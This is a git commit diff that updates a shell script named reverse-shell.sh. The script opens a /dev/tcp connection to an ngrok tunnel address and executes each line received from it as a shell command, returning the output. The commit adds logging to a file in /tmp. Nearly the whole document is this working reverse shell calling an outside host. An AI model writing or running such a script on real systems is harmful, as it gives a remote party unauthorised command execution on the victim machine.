35cca00bdeb07f498f1cdbcd4bf598dd6ca99a83
jihyangleee <160590749+jihyangleee@users.noreply.github.com>
2025-07-20 01:01:19 +0900

    Update reverse-shell.sh

--- reverse-shell.sh
+++ reverse-shell.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
-exec 5<>/dev/tcp/0.tcp.ngrok.io/18035
+echo "[*] Start reverse shell" > /tmp/revshell.log
+exec 5<>/dev/tcp/0.tcp.ngrok.io/18035 || echo "TCP connect failed" >> /tmp/revshell.log
+echo "[*] TCP opened" >> /tmp/revshell.log
 cat <&5 | while read line; do $line 2>&5 >&5; done
-
-
 
 
